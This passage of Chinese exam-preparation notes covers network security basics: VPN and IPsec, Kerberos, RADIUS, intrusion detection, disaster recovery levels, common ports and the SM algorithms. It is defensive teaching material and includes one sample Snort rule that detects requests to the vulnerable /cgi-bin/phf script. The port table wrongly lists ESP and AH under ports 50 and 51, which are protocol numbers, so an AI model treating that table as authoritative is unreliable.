<li><strong>L2TP</strong>：PPTP和Cisco L2F的结合，通常与IPsec结合使用</li>
</ul>
<h4 id="三层隧道协议"><a href="#三层隧道协议" class="headerlink" title="三层隧道协议"></a>三层隧道协议</h4><ul>
<li><strong>IPsec</strong>：<ul>
<li>AH(认证头)：提供数据源认证和完整性校验</li>
<li>ESP(封装安全载荷)：提供机密性、认证和完整性</li>
<li>IKE(互联网密钥交换)：用于建立安全关联</li>
<li>传输模式：只加密IP载荷</li>
<li>隧道模式：加密整个IP包</li>
</ul>
</li>
<li><strong>GRE</strong>：<ul>
<li>通用路由封装</li>
<li>通常与IPsec结合使用(GRE over IPsec)</li>
</ul>
</li>
</ul>
<h4 id="应用层隧道协议"><a href="#应用层隧道协议" class="headerlink" title="应用层隧道协议"></a>应用层隧道协议</h4><ul>
<li><strong>SSL&#x2F;TLS VPN</strong>：<ul>
<li>SSL VPN代理：通过浏览器访问特定应用</li>
<li>全隧道SSL VPN：建立完整网络连接</li>
</ul>
</li>
<li><strong>OpenVPN</strong>：<ul>
<li>基于OpenSSL库</li>
<li>配置灵活，可穿越NAT和防火墙</li>
</ul>
</li>
<li><strong>WireGuard</strong>：<ul>
<li>现代、高速、简洁的VPN协议</li>
<li>代码量少，性能高</li>
<li>使用UDP传输</li>
</ul>
</li>
<li><strong>SSH隧道</strong>：<ul>
<li>本地端口转发：将本地端口流量通过SSH隧道转发</li>
<li>远程端口转发：将远程端口流量通过SSH隧道转发</li>
</ul>
</li>
</ul>
<h4 id="根据VPN用途分类"><a href="#根据VPN用途分类" class="headerlink" title="根据VPN用途分类"></a>根据VPN用途分类</h4><ol>
<li><p><strong>远程访问VPN (Access VPN)</strong>：</p>
<ul>
<li>为远程用户提供安全接入企业内部网络</li>
<li>适用于移动办公、远程工作者</li>
</ul>
</li>
<li><p><strong>站点到站点VPN (Intranet VPN)</strong>：</p>
<ul>
<li>连接企业内部不同物理位置的网络</li>
<li>适用于企业总部与分支机构互联</li>
</ul>
</li>
<li><p><strong>基于特定协议的VPN</strong>：</p>
<ul>
<li>如SSL VPN、IPsec VPN等</li>
<li>依据底层协议实现方式分类</li>
</ul>
</li>
<li><p><strong>基于特定用途的VPN</strong>：</p>
<ul>
<li><strong>Extranet VPN</strong>：连接企业与合作伙伴网络</li>
<li><strong>Intranet VPN</strong>：连接企业内部网络</li>
</ul>
</li>
</ol>
<h2 id="四、安全协议与认证"><a href="#四、安全协议与认证" class="headerlink" title="四、安全协议与认证"></a>四、安全协议与认证</h2><h3 id="1-AAA认证体系"><a href="#1-AAA认证体系" class="headerlink" title="1. AAA认证体系"></a>1. AAA认证体系</h3><ul>
<li><strong>认证(Authentication)</strong>：验证用户身份</li>
<li><strong>授权(Authorization)</strong>：确定用户可使用的网络服务</li>
<li><strong>计帐(Accounting)</strong>：记录用户使用情况，用于计费</li>
</ul>
<h3 id="2-Kerberos认证协议"><a href="#2-Kerberos认证协议" class="headerlink" title="2. Kerberos认证协议"></a>2. Kerberos认证协议</h3><p><strong>Kerberos系统组成</strong>：</p>
<ul>
<li><strong>Client</strong>：请求服务的客户端</li>
<li><strong>Server</strong>：提供服务的服务器</li>
<li><strong>KDC</strong>：密钥分发中心<ul>
<li>AS：认证服务器</li>
<li>TGS：票据授予服务器</li>
</ul>
</li>
</ul>
<p><strong>认证过程</strong>：</p>
<ol>
<li><p><strong>初始认证</strong>：</p>
<ul>
<li>Client向AS请求TGT</li>
<li>AS验证Client身份，返回TGT和会话密钥</li>
</ul>
</li>
<li><p><strong>获取服务票据</strong>：</p>
<ul>
<li>Client用TGT向TGS请求服务票据</li>
<li>TGS验证TGT，返回服务票据ST和会话密钥</li>
</ul>
</li>
<li><p><strong>访问服务</strong>：</p>
<ul>
<li>Client用ST向Server请求服务</li>
<li>Server验证ST，提供服务</li>
</ul>
</li>
</ol>
<p><strong>票据类型</strong>：</p>
<ul>
<li>TGT(票据授予票据)：用于获取服务票据</li>
<li>ST(服务票据)：用于访问具体服务</li>
</ul>
<h3 id="3-RADIUS协议"><a href="#3-RADIUS协议" class="headerlink" title="3. RADIUS协议"></a>3. RADIUS协议</h3><ul>
<li><strong>远程认证拨号用户服务</strong></li>
<li><strong>特点</strong>：客户端&#x2F;服务器架构，基于UDP</li>
<li><strong>端口</strong>：认证1812，计费1813</li>
<li><strong>应用</strong>：网络接入认证、授权和计费</li>
</ul>
<h3 id="4-无线网络认证技术"><a href="#4-无线网络认证技术" class="headerlink" title="4. 无线网络认证技术"></a>4. 无线网络认证技术</h3><ul>
<li><strong>WEP</strong>：单向认证+弱加密，已不安全</li>
<li><strong>WPA&#x2F;WPA2</strong>：双向认证+AES加密</li>
<li><strong>WAPI</strong>：中国标准，双向认证+SM4加密<ul>
<li><strong>WAI</strong>：鉴别模块，使用非对称密码算法（SM2）进行身份认证</li>
<li><strong>WPI</strong>：保密模块，使用对称密码算法（SM4）进行加解密</li>
</ul>
</li>
</ul>
<h3 id="5-邮件收发协议"><a href="#5-邮件收发协议" class="headerlink" title="5. 邮件收发协议"></a>5. 邮件收发协议</h3><ul>
<li><p><strong>SMTP (Simple Mail Transfer Protocol)</strong>：用于发送邮件</p>
<ul>
<li>端口：25</li>
<li>特点：基于文本，明文传输（可使用STARTTLS加密）</li>
</ul>
</li>
<li><p><strong>POP3 (Post Office Protocol version 3)</strong>：</p>
<ul>
<li>端口：110</li>
<li>特点：将邮件下载到本地客户端，服务器通常不再保留</li>
<li>安全增强：POP3S（加密版本，端口995）</li>
</ul>
</li>
<li><p><strong>IMAP (Internet Message Access Protocol)</strong>：</p>
<ul>
<li>端口：143</li>
<li>特点：在服务器上管理邮件，可在多设备间同步</li>
<li>安全增强：IMAPS（加密版本，端口993）</li>
</ul>
</li>
</ul>
<h2 id="五、安全威胁与防御"><a href="#五、安全威胁与防御" class="headerlink" title="五、安全威胁与防御"></a>五、安全威胁与防御</h2><h3 id="1-攻击分类"><a href="#1-攻击分类" class="headerlink" title="1. 攻击分类"></a>1. 攻击分类</h3><h4 id="主动攻击"><a href="#主动攻击" class="headerlink" title="主动攻击"></a>主动攻击</h4><ul>
<li><strong>数据篡改</strong>：修改传输中的数据</li>
<li><strong>恶意代码植入</strong>：病毒、木马、勒索软件</li>
<li><strong>DDoS攻击</strong>：大量请求导致服务不可用</li>
<li><strong>特点</strong>：难以防止但可检测</li>
</ul>
<h4 id="被动攻击"><a href="#被动攻击" class="headerlink" title="被动攻击"></a>被动攻击</h4><ul>
<li><strong>网络监听</strong>：截获通信内容</li>
<li><strong>流量分析</strong>：分析通信模式</li>
<li><strong>密码嗅探</strong>：捕获密码明文</li>
<li><strong>特点</strong>：难以检测但可预防</li>
</ul>
<h3 id="2-APT攻击步骤"><a href="#2-APT攻击步骤" class="headerlink" title="2. APT攻击步骤"></a>2. APT攻击步骤</h3><ol>
<li><strong>情报收集</strong>：收集目标信息</li>
<li><strong>初始入侵</strong>：利用漏洞进入系统</li>
<li><strong>建立据点</strong>：安装后门，维持访问</li>
<li><strong>权限提升</strong>：获取更高权限</li>
<li><strong>横向移动</strong>：在网络中扩散</li>
<li><strong>数据收集与外传</strong>：窃取敏感数据</li>
<li><strong>持续化驻留</strong>：长期保持访问</li>
</ol>
<h3 id="3-入侵检测技术"><a href="#3-入侵检测技术" class="headerlink" title="3. 入侵检测技术"></a>3. 入侵检测技术</h3><h4 id="误用检测方法"><a href="#误用检测方法" class="headerlink" title="误用检测方法"></a>误用检测方法</h4><ul>
<li>基于规则：Snort、Suricata</li>
<li>基于迁移状态：STAT、USTAT</li>
<li>基于模式匹配：ClamAV</li>
<li>基于专家系统：MIDAS、IDES</li>
<li>基于协议分析：现代IDS</li>
</ul>
<h4 id="异常检测方法"><a href="#异常检测方法" class="headerlink" title="异常检测方法"></a>异常检测方法</h4><ul>
<li>基于统计：分析正常行为模式</li>
<li>基于模式预测：预测未来行为</li>
<li>基于文本分类：识别异常文本</li>
<li>基于贝叶斯推理：概率分析</li>
</ul>
<h4 id="入侵检测系统类型"><a href="#入侵检测系统类型" class="headerlink" title="入侵检测系统类型"></a>入侵检测系统类型</h4><ul>
<li><p><strong>HIDS (主机入侵检测系统)</strong>：</p>
<ul>
<li>部署在主机上，监测主机活动</li>
<li>可以检测本地攻击行为</li>
<li>不能检测网络层攻击</li>
<li>优点：对主机内部活动了解更详细</li>
<li>缺点：难以管理大规模部署</li>
</ul>
</li>
<li><p><strong>NIDS (网络入侵检测系统)</strong>：</p>
<ul>
<li>部署在网络边界或关键位置</li>
<li>监测网络流量</li>
<li>无法检测主机内部的攻击行为，如远程口令破解（但可以检测缓冲区溢出）</li>
<li>优点：对网络流量有全局视图</li>
<li>缺点：不能检测加密流量</li>
</ul>
</li>
<li><p><strong>DIDS (分布式入侵检测系统)</strong>：</p>
<ul>
<li>多个IDS组件分布在不同位置</li>
<li>通过协同工作检测分布式攻击</li>
<li>可以检测跨多个系统的攻击行为</li>
<li>优点：增强对分布式攻击的检测能力</li>
<li>缺点：部署和管理复杂</li>
</ul>
</li>
</ul>
<h4 id="Snort规则的组成"><a href="#Snort规则的组成" class="headerlink" title="Snort规则的组成"></a>Snort规则的组成</h4><p>Snort规则由规则头部和规则选项两部分组成：</p>
<ol>
<li><p><strong>规则头部</strong>：定义规则的基本属性</p>
<ul>
<li>规则动作（alert, log, pass, activate, dynamic）</li>
<li>协议（tcp, udp, icmp, ip）</li>
<li>源&#x2F;目的IP地址和端口</li>
<li>方向操作符（-&gt; 表示方向）</li>
</ul>
</li>
<li><p><strong>规则选项</strong>：定义规则的具体行为</p>
<ul>
<li><strong>消息</strong>：alert时显示的信息</li>
<li><strong>内容</strong>：匹配数据包内容</li>
<li><strong>标志</strong>：TCP标志位匹配</li>
<li><strong>端口</strong>：源&#x2F;目的端口匹配</li>
<li><strong>其他</strong>：多种检测条件</li>
</ul>
</li>
</ol>
<p>示例规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; $HOME_NET 80 (msg:&quot;WEB-MISC phf access&quot;; content:&quot;/cgi-bin/phf&quot;; nocase; sid:1001; rev:1;)</span><br></pre></td></tr></table></figure>

<h3 id="4-恶意代码分析"><a href="#4-恶意代码分析" class="headerlink" title="4. 恶意代码分析"></a>4. 恶意代码分析</h3><ul>
<li><strong>静态分析</strong>：不运行代码，直接分析</li>
<li><strong>动态分析</strong>：在受控环境中运行并监控<ul>
<li>系统行为监控</li>
<li>文件监控</li>
<li>网络监控</li>
</ul>
</li>
</ul>
<h3 id="5-恶意代码技术分类"><a href="#5-恶意代码技术分类" class="headerlink" title="5. 恶意代码技术分类"></a>5. 恶意代码技术分类</h3><ul>
<li><strong>进程注入技术</strong>：将代码注入到其他进程中</li>
<li><strong>超级管理技术</strong>：绕过安全限制</li>
<li><strong>端口反向链接技术</strong>：建立对外连接</li>
<li><strong>缓冲区溢出技术</strong>：利用缓冲区溢出漏洞</li>
</ul>
<h3 id="6-网络蠕虫传播方法"><a href="#6-网络蠕虫传播方法" class="headerlink" title="6. 网络蠕虫传播方法"></a>6. 网络蠕虫传播方法</h3><ol>
<li><strong>随机扫描</strong>：随机选择目标IP地址进行扫描</li>
<li><strong>顺序扫描</strong>：按顺序扫描IP地址范围</li>
<li><strong>选择性扫描</strong>：针对特定网络或主机进行扫描</li>
</ol>
<h2 id="六、安全管理与应急响应"><a href="#六、安全管理与应急响应" class="headerlink" title="六、安全管理与应急响应"></a>六、安全管理与应急响应</h2><h3 id="1-信息安全风险评估流程"><a href="#1-信息安全风险评估流程" class="headerlink" title="1. 信息安全风险评估流程"></a>1. 信息安全风险评估流程</h3><p>“识别风险→分析风险→评价风险→处理风险”的闭环管理</p>
<p><strong>具体步骤</strong>：</p>
<ol>
<li>资产识别</li>
<li>威胁识别</li>
<li>脆弱性识别</li>
<li>风险分析</li>
<li>风险评价</li>
<li>风险处理</li>
<li>持续监控</li>
</ol>
<p><strong>安全事件的风险值计算</strong>：</p>
<ul>
<li>安全事件发生的可能性 &#x3D; 脆弱性 × 威胁发生频率</li>
<li>安全事件的风险值 &#x3D; 安全事件发生的可能性 × 安全事件影响</li>
</ul>
<h3 id="2-应急响应常用技术"><a href="#2-应急响应常用技术" class="headerlink" title="2. 应急响应常用技术"></a>2. 应急响应常用技术</h3><ul>
<li><strong>隔离</strong>：将受影响系统隔离</li>
<li><strong>取证</strong>：收集和保存证据</li>
<li><strong>恢复</strong>：恢复系统和数据</li>
<li><strong>分析</strong>：分析攻击原因和方式</li>
<li><strong>报告</strong>：编写应急响应报告</li>
</ul>
<h3 id="3-容灾恢复等级"><a href="#3-容灾恢复等级" class="headerlink" title="3. 容灾恢复等级"></a>3. 容灾恢复等级</h3><table>
<thead>
<tr>
<th>等级</th>
<th>核心特征</th>
<th>关键技术</th>
<th>RPO</th>
<th>RTO</th>
</tr>
</thead>
<tbody><tr>
<td>0级</td>
<td>无异地数据</td>
<td>磁带+货车</td>
<td>数天&#x2F;周</td>
<td>数天&#x2F;周</td>
</tr>
<tr>
<td>1级</td>
<td>介质异地转运</td>
<td>磁带+货车+计划</td>
<td>24小时以上</td>
<td>24小时以上</td>
</tr>
<tr>
<td>2级</td>
<td>电子传送</td>
<td>网络传输备份数据</td>
<td>数小时至1天</td>
<td>数小时至1天</td>
</tr>
<tr>
<td>3级</td>
<td>电子传送+备用站点</td>
<td>热备站点+异步复制</td>
<td>数小时</td>
<td>数小时</td>
</tr>
<tr>
<td>4级</td>
<td>活动二级站点</td>
<td>集群+同步&#x2F;异步复制</td>
<td>数分钟至数小时</td>
<td>数分钟至数小时</td>
</tr>
<tr>
<td>5级</td>
<td>双中心</td>
<td>双向同步复制</td>
<td>0~数分钟</td>
<td>0~数分钟</td>
</tr>
<tr>
<td>6级</td>
<td>零数据丢失</td>
<td>分布式处理&#x2F;集群</td>
<td>0</td>
<td>极低</td>
</tr>
</tbody></table>
<h3 id="4-PDRR模型"><a href="#4-PDRR模型" class="headerlink" title="4. PDRR模型"></a>4. PDRR模型</h3><ul>
<li><strong>Protection</strong>：防御</li>
<li><strong>Detection</strong>：检测</li>
<li><strong>Response</strong>：响应</li>
<li><strong>Recovery</strong>：恢复</li>
</ul>
<h3 id="5-3R生存模型"><a href="#5-3R生存模型" class="headerlink" title="5. 3R生存模型"></a>5. 3R生存模型</h3><ul>
<li><strong>Resistance</strong>：抵抗</li>
<li><strong>Recognition</strong>：识别</li>
<li><strong>Recovery</strong>：恢复</li>
</ul>
<h2 id="七、其他重要安全概念"><a href="#七、其他重要安全概念" class="headerlink" title="七、其他重要安全概念"></a>七、其他重要安全概念</h2><h3 id="1-物理安全"><a href="#1-物理安全" class="headerlink" title="1. 物理安全"></a>1. 物理安全</h3><p><strong>物理隔离机制</strong>：</p>
<ul>
<li><strong>完全物理隔离</strong>：完全断开物理连接</li>
<li><strong>客户端隔离</strong>：<ul>
<li>双硬盘技术</li>
<li>单硬盘内外分区技术</li>
</ul>
</li>
<li><strong>数据交换隔离技术</strong>：<ul>
<li>信息摆渡技术</li>
<li>空气间隙</li>
</ul>
</li>
</ul>
<p><strong>物理隔离技术发展阶段</strong>：</p>
<ol>
<li>第一代：完全的物理隔离</li>
<li>第二代：硬件卡隔离</li>
<li>第三代：数据转播隔离</li>
<li>第四代：空气开关隔离</li>
<li>第五代：安全通道隔离</li>
</ol>
<h3 id="2-电磁泄漏"><a href="#2-电磁泄漏" class="headerlink" title="2. 电磁泄漏"></a>2. 电磁泄漏</h3><ul>
<li><strong>TEMPEST技术</strong>：防范电磁辐射导致的信息泄露</li>
<li><strong>防护措施</strong>：屏蔽机房、滤波技术、干扰技术</li>
</ul>
<h3 id="3-安全备份策略"><a href="#3-安全备份策略" class="headerlink" title="3. 安全备份策略"></a>3. 安全备份策略</h3><ul>
<li><strong>全备份</strong>：备份所有数据</li>
<li><strong>增量备份</strong>：备份自上次备份以来变化的数据</li>
<li><strong>差分备份</strong>：备份自上次全备份以来变化的数据</li>
<li><strong>镜像备份</strong>：实时同步备份</li>
</ul>
<h3 id="4-常用网络端口"><a href="#4-常用网络端口" class="headerlink" title="4. 常用网络端口"></a>4. 常用网络端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>协议</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>FTP</td>
<td>文件传输</td>
</tr>
<tr>
<td>22</td>
<td>SSH</td>
<td>安全远程登录</td>
</tr>
<tr>
<td>23</td>
<td>Telnet</td>
<td>远程登录（明文）</td>
</tr>
<tr>
<td>25</td>
<td>SMTP</td>
<td>邮件传输</td>
</tr>
<tr>
<td>53</td>
<td>DNS</td>
<td>域名解析</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Web服务</td>
</tr>
<tr>
<td>110</td>
<td>POP3</td>
<td>邮件接收</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS</td>
<td>安全Web服务</td>
</tr>
<tr>
<td>500</td>
<td>IKE</td>
<td>IPsec密钥交换</td>
</tr>
<tr>
<td>4500</td>
<td>IPsec NAT</td>
<td>IPsec NAT穿透</td>
</tr>
<tr>
<td>50</td>
<td>ESP</td>
<td>IPsec封装安全载荷</td>
</tr>
<tr>
<td>51</td>
<td>AH</td>
<td>IPsec认证头</td>
</tr>
<tr>
<td>1433</td>
<td>SQL Server</td>
<td>数据库服务</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
<td>远程桌面</td>
</tr>
<tr>
<td>161</td>
<td>SNMP</td>
<td>网络管理</td>
</tr>
</tbody></table>
<h3 id="5-私有IP地址范围"><a href="#5-私有IP地址范围" class="headerlink" title="5. 私有IP地址范围"></a>5. 私有IP地址范围</h3><ul>
<li><strong>A类</strong>：10.0.0.0 ~ 10.255.255.255</li>
<li><strong>B类</strong>：172.16.0.0 ~ 172.31.255.255</li>
<li><strong>C类</strong>：192.168.0.0 ~ 192.168.255.255</li>
<li><strong>共享地址</strong>：100.64.0.0 ~ 100.127.255.255</li>
</ul>
<h3 id="6-安卓系统架构"><a href="#6-安卓系统架构" class="headerlink" title="6. 安卓系统架构"></a>6. 安卓系统架构</h3><ul>
<li><strong>Linux内核层</strong>：提供基础功能和硬件驱动</li>
<li><strong>硬件抽象层(HAL)</strong>：提供硬件接口</li>
<li><strong>Android运行时</strong>：<ul>
<li><strong>Dalvik虚拟机</strong>：早期Android使用的虚拟机</li>
<li><strong>ART虚拟机</strong>：Android 5.0后使用的虚拟机，性能更高</li>
</ul>
</li>
<li><strong>系统库层</strong>：提供C&#x2F;C++库</li>
<li><strong>应用框架层</strong>：提供Java API</li>
<li><strong>应用层</strong>：用户可见的应用程序</li>
</ul>
<p><strong>文件格式</strong>：</p>
<ul>
<li><strong>.dex</strong>：Dalvik&#x2F;ART虚拟机可执行的文件格式</li>
<li><strong>.apk</strong>：安卓应用的打包文件，包含.dex</li>
</ul>
<h2 id="八、国密算法体系"><a href="#八、国密算法体系" class="headerlink" title="八、国密算法体系"></a>八、国密算法体系</h2><h3 id="1-SM1"><a href="#1-SM1" class="headerlink" title="1. SM1"></a>1. SM1</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>特点</strong>：硬件实现，安全性等同于AES</li>
</ul>
<h3 id="2-SM2"><a href="#2-SM2" class="headerlink" title="2. SM2"></a>2. SM2</h3><ul>
<li><strong>类型</strong>：非对称加密算法</li>
<li><strong>密钥长度</strong>：256位</li>
<li><strong>基础</strong>：椭圆曲线密码学</li>
<li><strong>用途</strong>：数字签名、密钥交换、加密</li>
</ul>
<h3 id="3-SM3"><a href="#3-SM3" class="headerlink" title="3. SM3"></a>3. SM3</h3><ul>
<li><strong>类型</strong>：哈希算法</li>
<li><strong>输出长度</strong>：256位</li>
<li><strong>特点</strong>：安全性等同于SHA-256</li>
</ul>
<h3 id="4-SM4"><a href="#4-SM4" class="headerlink" title="4. SM4"></a>4. SM4</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>用途</strong>：无线局域网标准</li>
</ul>
<h3 id="5-SM7"><a href="#5-SM7" class="headerlink" title="5. SM7"></a>5. SM7</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>用途</strong>：非接触式IC卡应用</li>
</ul>
<h3 id="6-SM9"><a href="#6-SM9" class="headerlink" title="6. SM9"></a>6. SM9</h3><ul>
<li><strong>类型</strong>：非对称加密算法</li>
<li><strong>特点</strong>：基于标识的密码系统</li>
<li><strong>用途</strong>：身份认证、密钥交换</li>
</ul>
<h2 id="九、网络安全管理框架"><a href="#九、网络安全管理框架" class="headerlink" title="九、网络安全管理框架"></a>九、网络安全管理框架</h2><h3 id="1-网络信息安全管理5个阶段"><a href="#1-网络信息安全管理5个阶段" class="headerlink" title="1. 网络信息安全管理5个阶段"></a>1. 网络信息安全管理5个阶段</h3><ol>
<li><strong>识别</strong>：识别组织资产、风险和威胁</li>
<li><strong>保护</strong>：实施安全控制措施</li>
<li><strong>检测</strong>：持续监控安全事件</li>
<li><strong>响应</strong>：对安全事件进行响应</li>
<li><strong>恢复</strong>：从安全事件中恢复</li>
</ol>
<h3 id="2-网络风险管理步骤"><a href="#2-网络风险管理步骤" class="headerlink" title="2. 网络风险管理步骤"></a>2. 网络风险管理步骤</h3><ol>
<li><strong>识别</strong>：识别资产、威胁和脆弱性</li>
<li><strong>评估</strong>：评估风险可能性和影响</li>
<li><strong>控制</strong>：实施风险控制措施</li>
<li><strong>监控</strong>：持续监控风险状态</li>
</ol>
<h3 id="3-蜜罐技术"><a href="#3-蜜罐技术" class="headerlink" title="3. 蜜罐技术"></a>3. 蜜罐技术</h3><ul>
<li><strong>空系统</strong>：无实际服务的诱饵系统</li>
<li><strong>镜像系统</strong>：真实系统的副本</li>
<li><strong>虚拟系统</strong>：模拟真实系统的虚拟环境</li>
</ul>
<h3 id="4-安全评估指标"><a href="#4-安全评估指标" class="headerlink" title="4. 安全评估指标"></a>4. 安全评估指标</h3><ul>
<li><strong>RPO</strong>(Recovery Point Objective)：可接受的最大数据丢失量</li>
<li><strong>RTO</strong>(Recovery Time Objective)：可接受的最大服务中断时间</li>
<li><strong>MTD</strong>(Maximum Tolerable Downtime)：最大可容忍停机时间</li>
</ul>
<h2 id="十、安全工具与技术"><a href="#十、安全工具与技术" class="headerlink" title="十、安全工具与技术"></a>十、安全工具与技术</h2><h3 id="1-网络扫描技术"><a href="#1-网络扫描技术" class="headerlink" title="1. 网络扫描技术"></a>1. 网络扫描技术</h3><h4 id="端口扫描技术全面详解"><a href="#端口扫描技术全面详解" class="headerlink" title="端口扫描技术全面详解"></a>端口扫描技术全面详解</h4><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="2-ARP欺骗过程"><a href="#2-ARP欺骗过程" class="headerlink" title="2. ARP欺骗过程"></a>2. ARP欺骗过程</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="3-SSL-TLS协议详解"><a href="#3-SSL-TLS协议详解" class="headerlink" title="3. SSL&#x2F;TLS协议详解"></a>3. SSL&#x2F;TLS协议详解</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="4-IPsec协议详解"><a href="#4-IPsec协议详解" class="headerlink" title="4. IPsec协议详解"></a>4. IPsec协议详解</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="5-常见安全事件与漏洞对应关系"><a href="#5-常见安全事件与漏洞对应关系" class="headerlink" title="5. 常见安全事件与漏洞对应关系"></a>5. 常见安全事件与漏洞对应关系</h3><h4 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h4><ol>
<li><p><strong>非技术性安全漏洞</strong>：</p>
<ul>
<li>网络安全责任主体不明确</li>
<li>网络安全策略不完备</li>
<li>网络安全操作技能不足</li>
<li>网络安全监督缺失</li>
<li>网络安全特权控制不完备</li>
</ul>
</li>
<li><p><strong>技术性安全漏洞</strong>：</p>
<ul>
<li>设计错误</li>
<li>输入验证错误</li>
<li>缓冲区溢出</li>
<li>意外情况处置错误</li>
<li>访问验证错误</li>
<li>配置错误</li>
<li>竞争条件</li>
<li>环境错误</li>
</ul>
</li>
</ol>
<h4 id="常见安全事件与漏洞对应关系"><a href="#常见安全事件与漏洞对应关系" class="headerlink" title="常见安全事件与漏洞对应关系"></a>常见安全事件与漏洞对应关系</h4><table>
<thead>
<tr>
<th>安全事件</th>
<th>对应漏洞</th>
<th>防御措施</th>
</tr>
</thead>
<tbody><tr>
<td>SQL注入</td>
<td>输入验证错误</td>
<td>参数化查询、输入过滤、WAF</td>
</tr>
<tr>
<td>XSS攻击</td>
<td>输入验证错误</td>
<td>输出编码、内容安全策略</td>
</tr>
<tr>
<td>CSRF攻击</td>
<td>访问验证错误</td>
<td>CSRF令牌、SameSite Cookie</td>
</tr>
<tr>
<td>缓冲区溢出</td>
<td>编程错误</td>
<td>安全编码实践、边界检查</td>
</tr>
<tr>
<td>远程口令破解</td>
<td>认证机制缺陷</td>
<td>强密码策略、多因素认证、账户锁定</td>
</tr>
<tr>
<td>未授权访问</td>
<td>访问控制缺陷</td>
<td>最小权限原则、RBAC模型</td>
</tr>
<tr>
<td>信息泄露</td>
<td>配置错误</td>
<td>安全配置审核、敏感信息保护</td>
</tr>
<tr>
<td>会话劫持</td>
<td>会话管理缺陷</td>
<td>安全会话管理、HTTPS</td>
</tr>
</tbody></table>
<h3 id="6-Apache-Web日志文件"><a href="#6-Apache-Web日志文件" class="headerlink" title="6. Apache Web日志文件"></a>6. Apache Web日志文件</h3><ul>
<li><p><strong>访问日志 (access.log)</strong>：</p>
<ul>
<li>记录所有HTTP请求信息</li>
<li>包含客户端IP、请求时间、请求方法、URL、HTTP状态码、响应大小等</li>
<li>格式可自定义，通常为Common Log Format或Combined Log Format</li>
</ul>
</li>
<li><p><strong>错误日志 (error.log)</strong>：</p>
<ul>
<li>记录服务器运行中的错误信息</li>
<li>包含错误级别、时间、错误消息、相关请求等</li>
<li>帮助诊断服务器问题</li>
</ul>
</li>
<li><p><strong>其他日志</strong>：</p>
<ul>
<li>代理日志：记录通过Apache代理的请求</li>
<li>SSL日志：记录SSL&#x2F;TLS连接相关信息</li>
<li>自定义日志：根据需求配置的特定日志</li>
</ul>
</li>
</ul>
<h2 id="十一、安全编码与实践"><a href="#十一、安全编码与实践" class="headerlink" title="十一、安全编码与实践"></a>十一、安全编码与实践</h2><h3 id="1-安全编码原则"><a href="#1-安全编码原则" class="headerlink" title="1. 安全编码原则"></a>1. 安全编码原则</h3><ul>
<li><strong>最小权限原则</strong>：程序只拥有完成任务所需的最小权限</li>
<li><strong>防御性编程</strong>：假设所有输入都是恶意的</li>
<li><strong>输入验证</strong>：对所有输入进行严格验证</li>
<li><strong>输出编码</strong>：防止XSS等攻击</li>
<li><strong>错误处理</strong>：安全地处理错误，不泄露敏感信息</li>
</ul>
<h3 id="2-常见安全漏洞"><a href="#2-常见安全漏洞" class="headerlink" title="2. 常见安全漏洞"></a>2. 常见安全漏洞</h3><ul>
<li><strong>缓冲区溢出</strong>：数据写入超过缓冲区容量</li>
<li><strong>SQL注入</strong>：在SQL查询中插入恶意代码</li>
<li><strong>XSS</strong>：在网页中注入恶意脚本</li>
<li><strong>CSRF</strong>：跨站请求伪造</li>
<li><strong>命令注入</strong>：在系统命令中注入恶意代码</li>
<li><strong>不安全的直接对象引用</strong>：直接暴露内部对象</li>
</ul>
<h3 id="3-安全开发流程"><a href="#3-安全开发流程" class="headerlink" title="3. 安全开发流程"></a>3. 安全开发流程</h3><ol>
<li><strong>需求阶段</strong>：识别安全需求</li>
<li><strong>设计阶段</strong>：设计安全架构</li>
<li><strong>实现阶段</strong>：安全编码实践</li>
<li><strong>测试阶段</strong>：安全测试和渗透测试</li>
<li><strong>部署阶段</strong>：安全配置和监控</li>
<li><strong>维护阶段</strong>：持续安全评估和更新</li>
</ol>
<h2 id="十二、总结与应试要点"><a href="#十二、总结与应试要点" class="headerlink" title="十二、总结与应试要点"></a>十二、总结与应试要点</h2><h3 id="1-国密算法（重中之重）"><a href="#1-国密算法（重中之重）" class="headerlink" title="1. 国密算法（重中之重）"></a>1. 国密算法（重中之重）</h3><ul>
<li><strong>SM1&#x2F;SM4&#x2F;SM7</strong>：对称加密，密钥和分组都是128位</li>
<li><strong>SM2</strong>：非对称加密（基于ECC），用于签名&#x2F;密钥交换&#x2F;加密</li>
<li><strong>SM3</strong>：哈希算法，输出256位</li>
</ul>
<h3 id="2-对称加密"><a href="#2-对称加密" class="headerlink" title="2. 对称加密"></a>2. 对称加密</h3><ul>
<li><strong>DES</strong>：56位密钥，64位分组，已不安全</li>
<li><strong>3DES</strong>：112&#x2F;168位密钥，64位分组，速度慢</li>
<li><strong>AES</strong>：128&#x2F;192&#x2F;256位密钥，128位分组，当前标准</li>
<li><strong>SM4</strong>：国密对称加密算法</li>
</ul>
<h3 id="3-非对称加密"><a href="#3-非对称加密" class="headerlink" title="3. 非对称加密"></a>3. 非对称加密</h3><ul>
<li><strong>RSA</strong>：基于大整数因子分解，密钥长（1024&#x2F;2048位）</li>
<li><strong>ECC&#x2F;SM2</strong>：基于椭圆曲线，密钥短（160-256位），效率高</li>
<li><strong>DSA</strong>：仅用于签名，不能加密</li>
</ul>
<h3 id="4-哈希算法"><a href="#4-哈希算法" class="headerlink" title="4. 哈希算法"></a>4. 哈希算法</h3><ul>
<li><strong>MD5</strong>：128位输出，已不安全</li>
<li><strong>SHA-1</strong>：160位输出，已不安全</li>
